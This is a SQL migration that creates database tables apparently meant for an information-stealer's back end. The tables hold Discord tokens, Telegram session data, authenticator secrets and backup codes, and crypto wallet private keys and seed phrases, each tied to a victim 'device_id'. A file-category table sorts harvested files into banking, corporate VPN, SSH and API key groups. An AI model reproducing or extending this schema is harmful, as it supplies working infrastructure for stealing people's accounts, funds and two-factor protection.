-- Add Discord tokens table
CREATE TABLE IF NOT EXISTS discord_tokens (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(255) NOT NULL,
  token TEXT NOT NULL,
  token_type ENUM('discord', 'discord_ptb', 'discord_canary', 'browser', 'unknown') DEFAULT 'unknown',
  user_id VARCHAR(255) NULL,
  username VARCHAR(255) NULL,
  email VARCHAR(255) NULL,
  phone VARCHAR(50) NULL,
  mfa_enabled BOOLEAN NULL,
  verified BOOLEAN NULL,
  file_path TEXT NULL,
  source_application VARCHAR(100) NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_device_id (device_id),
  INDEX idx_user_id (user_id),
  INDEX idx_token_type (token_type),
  INDEX idx_email (email),
  UNIQUE KEY unique_token (device_id, token(255))
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Add Telegram sessions table
CREATE TABLE IF NOT EXISTS telegram_sessions (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(255) NOT NULL,
  tdata_path TEXT NOT NULL,
  has_key_data BOOLEAN DEFAULT FALSE,
  has_user_data BOOLEAN DEFAULT FALSE,
  has_map_files BOOLEAN DEFAULT FALSE,
  session_type ENUM('desktop', 'portable', 'unknown') DEFAULT 'unknown',
  file_count INT DEFAULT 0,
  total_size BIGINT DEFAULT 0,
  original_path TEXT NULL,
  phone_number VARCHAR(50) NULL,
  username VARCHAR(255) NULL,
  user_id VARCHAR(255) NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_device_id (device_id),
  INDEX idx_session_type (session_type),
  INDEX idx_has_key_data (has_key_data),
  INDEX idx_username (username),
  INDEX idx_phone_number (phone_number)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Add 2FA/Authenticator data table
CREATE TABLE IF NOT EXISTS authenticator_data (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(255) NOT NULL,
  app_type ENUM('authy', 'google_authenticator', 'microsoft_authenticator', 'browser_extension', 'other') DEFAULT 'other',
  service_name VARCHAR(255) NULL,
  account_name VARCHAR(255) NULL,
  secret_key TEXT NULL,
  backup_codes TEXT NULL,
  qr_code_path TEXT NULL,
  file_path TEXT NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_device_id (device_id),
  INDEX idx_app_type (app_type),
  INDEX idx_service_name (service_name)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Add crypto wallet data table
CREATE TABLE IF NOT EXISTS crypto_wallets (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(255) NOT NULL,
  wallet_type ENUM('browser_extension', 'desktop_app', 'mobile', 'other') DEFAULT 'other',
  wallet_name VARCHAR(255) NULL COMMENT 'MetaMask, Exodus, Electrum, etc.',
  address TEXT NULL,
  private_key TEXT NULL,
  seed_phrase TEXT NULL,
  mnemonic TEXT NULL,
  keystore_file TEXT NULL,
  password_hint TEXT NULL,
  file_path TEXT NULL,
  blockchain VARCHAR(100) NULL COMMENT 'ETH, BTC, SOL, etc.',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  INDEX idx_device_id (device_id),
  INDEX idx_wallet_type (wallet_type),
  INDEX idx_wallet_name (wallet_name),
  INDEX idx_blockchain (blockchain)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Add file categorization table
CREATE TABLE IF NOT EXISTS file_categories (
  id INT AUTO_INCREMENT PRIMARY KEY,
  device_id VARCHAR(255) NOT NULL,
  file_id INT NULL,
  category ENUM(
    'messaging',          -- Discord, Telegram, Slack
    'authentication',     -- 2FA, authenticators
    'crypto_wallet',      -- Crypto wallets
    'gaming',            -- Steam, Epic, etc.
    'financial',         -- Banking, PayPal
    'corporate',         -- Business emails, VPNs
    'social_media',      -- Facebook, Twitter, etc.
    'developer',         -- SSH keys, API keys
    'email',             -- Email clients
    'vpn_ftp',           -- VPN/FTP configs
    'other'
  ) DEFAULT 'other',
  subcategory VARCHAR(100) NULL COMMENT 'Discord, Steam, MetaMask, etc.',
  confidence_score DECIMAL(3,2) DEFAULT 0.0 COMMENT 'AI confidence 0-1',
  tags JSON NULL COMMENT 'Additional tags for filtering',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (file_id) REFERENCES files(id) ON DELETE CASCADE,
  INDEX idx_device_id (device_id),
  INDEX idx_category (category),
  INDEX idx_subcategory (subcategory),
  INDEX idx_file_id (file_id)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
